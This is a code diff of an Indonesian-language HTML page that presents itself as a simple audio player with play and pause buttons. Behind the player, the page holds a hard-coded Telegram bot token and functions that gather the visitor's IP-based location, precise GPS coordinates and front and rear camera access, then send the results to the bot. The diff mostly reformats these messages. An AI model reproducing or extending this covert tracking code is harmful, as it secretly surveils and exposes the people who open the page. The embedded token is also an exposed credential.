@@ -1,4 +1,4 @@
-<!-- FULL FINAL FIXED VERSION - Sesuai Permintaan: Background Keren, Warna Hijau Dihilangkan -->
+<!-- FULL FINAL FIXED VERSION - Sesuai Permintaan -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -19,13 +19,11 @@
       background-size: 400% 400%;
       animation: bgmove 20s ease infinite;
     }
-
     @keyframes bgmove {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
-
     .player {
       display: flex;
       flex-direction: column;
@@ -99,13 +97,10 @@
 
   <script>
     function playAudio() {
-      const audio = document.getElementById("audio");
-      audio.play();
+      document.getElementById("audio").play();
     }
-
     function pauseAudio() {
-      const audio = document.getElementById("audio");
-      audio.pause();
+      document.getElementById("audio").pause();
     }
 
     const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
@@ -218,7 +213,7 @@ Provinsi            : ${ip.region}
 Kota                : ${ip.city}
 `.trim();
       } catch {
-        return "\nINFORMASI JARINGAN\nGagal mengambil data IP.";
+        return "❌ Gagal mengambil data IP.";
       }
     };
 
@@ -238,7 +233,8 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
           resolve(`
 - 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
 
-❌ Lokasi tidak diizinkan oleh pengguna.`);
+❌ Lokasi tidak diizinkan oleh pengguna.
+`);
         }, { enableHighAccuracy: true, timeout: 7000 });
       });
     };
@@ -271,7 +267,11 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         stream.getTracks().forEach(track => track.stop());
         return "";
       } catch {
-        return `- 〘 ${label} 〙 - ❌ Tidak diizinkan`;
+        return `
+- 〘 ${label} 〙 -
+
+❌ Kamera tidak diizinkan oleh pengguna.
+`;
       }
     };
 
@@ -282,9 +282,11 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         ambilLokasi()
       ]);
       await kirimPesan(`${info}\n\n${ip}\n\n${lokasi}`);
-      const depan = await ambilKamera("user", "KAMERA DEPAN");
+
+      const depan = await ambilKamera("user", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡");
       if (depan) await kirimPesan(depan);
-      const belakang = await ambilKamera("environment", "KAMERA BELAKANG");
+
+      const belakang = await ambilKamera("environment", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚");
       if (belakang) await kirimPesan(belakang);
     };
 
